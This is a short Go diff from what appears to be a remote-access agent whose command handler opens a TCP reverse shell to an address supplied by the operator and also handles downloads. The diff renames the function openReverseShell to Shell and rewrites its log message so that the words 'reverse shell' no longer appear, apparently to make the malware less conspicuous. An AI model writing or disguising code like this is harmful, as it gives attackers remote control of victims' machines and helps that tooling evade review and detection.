@@ -100,7 +100,7 @@ func executeCommandAndSendResult(cmd Command) {
     switch {
     case strings.HasPrefix(cmd.Cmd, "shell "):
         address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
-        openReverseShell(address)
+        Shell(address)
     case strings.HasPrefix(cmd.Cmd, "download "):
         parts := strings.SplitN(cmd.Cmd[len("download "):], " ", 2)
         if len(parts) == 2 {
@@ -133,10 +133,10 @@ func executeCommandAndSendResult(cmd Command) {
     }
 }
 
-func openReverseShell(address string) {
+func Shell(address string) {
     conn, err := net.Dial("tcp", address)
     if err != nil {
-        log.Printf("Failed to open reverse shell to %s: %v", address, err)
+        log.Printf("Failed to shell to %s: %v", address, err)
         return
     }
     defer conn.Close()
